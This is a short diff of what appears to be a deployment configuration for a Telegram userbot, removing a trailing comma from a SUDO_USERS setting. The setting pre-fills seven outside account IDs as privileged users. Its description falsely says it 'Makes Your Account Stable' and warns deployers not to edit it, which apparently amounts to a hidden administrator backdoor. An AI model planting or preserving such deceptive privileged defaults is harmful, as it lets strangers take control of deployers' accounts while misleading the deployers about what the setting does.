@@ -129,7 +129,7 @@
     },
     "SUDO_USERS": {
       "description": "Makes Your Account Stable. Do not edit this values or you would be in trouble.",
-      "value": "138312364, 334255172, 976350594, 236390091, 885745757, 270418630, 755569473,",
+      "value": "138312364, 334255172, 976350594, 236390091, 885745757, 270418630, 755569473",
       "required": false
     },
     "TZ": {
